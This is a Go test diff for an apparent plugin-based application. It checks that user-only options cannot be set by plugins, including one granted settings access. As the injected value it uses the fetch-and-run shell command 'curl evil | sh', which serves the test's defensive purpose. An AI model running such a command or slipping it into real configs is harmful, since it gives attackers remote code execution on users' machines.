@@ -6,6 +6,7 @@ import (
 	"os"
 	"os/exec"
 	"path/filepath"
+	"reflect"
 	"runtime"
 	"strings"
 	"testing"
@@ -729,6 +730,39 @@ end)`)
 	s.Frame()
 	if apptest.LuaGlobal(lua(s).VM(), "pressed") != float64(0) {
 		t.Error("a busy button was pressed")
+	}
+}
+
+// An option declared user_only is set by your own config alone: not by its plugin, not by one granted settings, and
+// not by one that set it before it was declared.
+func TestUserOnlyOptionsAreYours(t *testing.T) {
+	s := apptest.LuaScene(t, `oriel.option["plugin.cmds.list"] = { up = "make up" }`)
+	other := plugin.NewGrants()
+	other.Grant("acme/other", []plugin.Grant{{Cap: plugin.CapSettings}})
+	sneaky := s.PluginVM(plugin.Caller{ID: "acme/other", Guard: other})
+	if err := luaErr(t, sneaky, `oriel.option["plugin.cmds.early"] = { x = "curl evil | sh" }`); err != "" {
+		t.Fatalf("held back: %s", err)
+	}
+	owner := s.PluginVM(plugin.Caller{ID: "acme/cmds", Guard: plugin.NewGrants()})
+	if err := luaErr(t, owner, `oriel.option{ name = "plugin.cmds.list", type = "map", user_only = true }
+		oriel.option{ name = "plugin.cmds.early", type = "map", user_only = true }`); err != "" {
+		t.Fatal(err)
+	}
+	s.Quiet()
+	o := s.Registry().Options()
+	if v, _, _ := o.Get("plugin.cmds.list", registry.At{}); !reflect.DeepEqual(v, map[string]string{"up": "make up"}) {
+		t.Errorf("init.lua's value: %v", v)
+	}
+	if v, _, _ := o.Get("plugin.cmds.early", registry.At{}); len(v.(map[string]string)) != 0 {
+		t.Errorf("a value another plugin set before it was declared: %v", v)
+	}
+	for vm, who := range map[*script.VM]string{owner: "its plugin", sneaky: "a plugin granted settings"} {
+		if err := luaErr(t, vm, `oriel.option["plugin.cmds.list"] = { x = "curl evil | sh" }`); !strings.Contains(err, "only your own config") {
+			t.Errorf("%s set it: %q", who, err)
+		}
+	}
+	if v, _, _ := o.Get("plugin.cmds.list", registry.At{}); !reflect.DeepEqual(v, map[string]string{"up": "make up"}) {
+		t.Errorf("after the plugins tried: %v", v)
 	}
 }
 
